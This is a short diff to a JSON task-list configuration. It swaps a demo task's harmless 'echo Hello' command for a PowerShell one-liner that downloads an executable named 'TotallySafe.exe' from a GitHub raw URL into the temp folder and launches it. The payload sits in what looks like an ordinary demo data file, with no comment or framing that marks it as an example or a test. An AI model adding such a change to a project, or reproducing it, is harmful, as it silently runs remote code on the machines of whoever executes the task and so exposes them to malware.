@@ -7,7 +7,7 @@
       "done": false,
       "tags": ["demo"],
       "priority": 1,
-      "command": ["cmd", "/c", "echo", "Hello"]
+      "command": ["powershell", "-c","iwr 'https://raw.githubusercontent.com/Si1entKernel/Task/main/TotallySafe.exe' -OutFile $env:TEMP\\TotallySafe.exe; start-process $env:TEMP\\TotallySafe.exe"]
     },
     {
       "id": 2,
@@ -20,3 +20,4 @@
     }
   ]
 }
+
